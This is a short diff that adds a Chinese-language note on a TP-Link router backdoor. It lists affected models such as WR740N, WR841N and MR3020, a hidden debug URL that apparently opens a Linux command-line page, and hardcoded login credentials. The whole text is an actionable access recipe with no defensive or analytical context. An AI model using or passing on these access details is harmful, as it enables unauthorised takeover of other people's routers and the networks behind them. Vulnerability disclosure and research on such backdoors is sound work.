@@ -1,0 +1,13 @@
+tp-link后门
+涉及的
+WR740N, WR740ND, WR743ND,WR842ND,WA-901ND,WR941N,WR941ND,WR1043ND,WR2543ND,MR3220,MR3020,WR841N 
+
+
+访问
+http://ip/userRpmNatDebugRpm26525557/linux_cmdline.html
+
+
+用户名：osteam
+密码:5up
+
+ 
